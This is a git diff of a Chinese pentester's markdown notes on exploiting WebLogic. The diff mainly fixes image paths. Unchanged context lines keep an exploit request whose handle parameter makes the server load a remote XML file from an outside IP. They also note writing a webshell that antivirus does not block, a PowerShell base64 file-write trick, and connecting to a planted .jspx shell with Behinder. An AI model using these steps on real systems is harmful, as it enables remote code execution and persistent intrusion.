@@ -1,4 +1,6 @@
-### 使用docker搭建环境 
+### :deciduous_tree:使用docker搭建环境 
+
+:deciduous_tree:后面使用windows下的weblogic安装包搭建的
 
 参考链接：
 
@@ -35,9 +37,9 @@ Content-Length: 160
 _nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://139.9.182.45:81/poc1.xml")
 ```
 
-![image-20201030221311751](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201030221311751.png)
+![image-20201030221311751](/img/image-20201030221311751.png)
 
-![image-20201030221256774](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201030221256774.png)
+![image-20201030221256774](/img/image-20201030221256774.png)
 
 ### poc1.xml中的内容如下：
 
@@ -134,13 +136,13 @@ poc.xml 如下
 
 结果：
 
-![image-20201118175217086](D:\学习资料\markdown笔记\img\image-20201118175217086.png)
+![image-20201118175217086](img\image-20201118175217086.png)
 
 写入文件成功，而且杀软不拦截
 
 Shell连接：
 
-![image-20201118175436535](D:\学习资料\markdown笔记\img\image-20201118175436535.png)
+![image-20201118175436535](img\image-20201118175436535.png)
 
 #### 方法二：powershell base64 写文件
 
@@ -149,7 +151,7 @@ $data = 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
 [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
 ```
 
-![image-20201118175909467](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201118175909467.png)
+![image-20201118175909467](\img\image-20201118175909467.png)
 
 但是本地试了下 冰鞋的马写入解码的时候会自动换行，造成无法解析，目前没搜到解决方法
 
@@ -197,7 +199,7 @@ Poc3.xml
 </beans> 
 ```
 
-![image-20201118182130772](D:\学习资料\markdown笔记\img\image-20201118182130772.png)
+![image-20201118182130772](\img\image-20201118182130772.png)
 
 使用冰鞋连接正常 http://192.168.42.101:7001/console/images/xxx.jspx
 
@@ -285,11 +287,11 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-![image-20201102144406997](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201102144406997.png)
+![image-20201102144406997](\img\image-20201102144406997.png)
 
 #### 写文件：
 
-![image-20201102145953121](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201102145953121.png)
+![image-20201102145953121](\img\image-20201102145953121.png)
 
 
 
